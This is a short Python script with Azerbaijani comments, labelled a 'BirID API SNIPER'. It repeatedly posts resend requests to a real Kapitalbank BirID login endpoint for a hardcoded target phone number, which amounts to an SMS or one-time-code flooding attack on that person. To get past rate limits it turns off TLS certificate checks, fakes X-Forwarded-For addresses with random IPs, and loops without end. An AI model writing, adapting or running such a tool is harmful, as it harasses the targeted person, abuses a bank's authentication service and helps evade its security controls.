import urllib.request
import json
import random
import time
import ssl

# --- SƏLAHİYYƏTLİ HƏDƏF ---
TARGET_PHONE = "508880067" 

def strike():
    print(f"[!!!] BirID API SNIPER AKTİVDİR: 994{TARGET_PHONE}")
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    # Şəkildəki məlumatlar əsasında qurulmuş real API ünvanı
    url = "https://bird.kapitalbank.az/auth/realms/bird/login-actions/authenticate"
    
    # Bu parametrlər sizin şəkildəki seansınıza uyğunlaşdırılmışdır
    params = "client_id=umico&tab_id=ey5TL8FdROE"
    full_url = f"{url}?{params}"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://bird.kapitalbank.az/",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }

    # BirID üçün lazım olan real POST payload formatı
    payload = f"phoneNumber={TARGET_PHONE}&resend=true&login="
    data = payload.encode('utf-8')

    while True:
        try:
            req = urllib.request.Request(full_url, data=data, headers=headers, method='POST')
            
            with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
                status = resp.getcode()
                print(f"[HIT] BirID-Umico siqnalı uğurlu! Status: {status}")
            
            # Rate Limit-ə düşməmək və sönməmək üçün 2 saniyəlik fasilə
            time.sleep(2)

        except Exception as e:
            # Əgər status 403 və ya 404-dürsə, biz təkrar yoxlayırıq
            print(f"[*] Bağlantı yoxlanılır... {e}")
            time.sleep(5)

if __name__ == "__main__":
    strike()
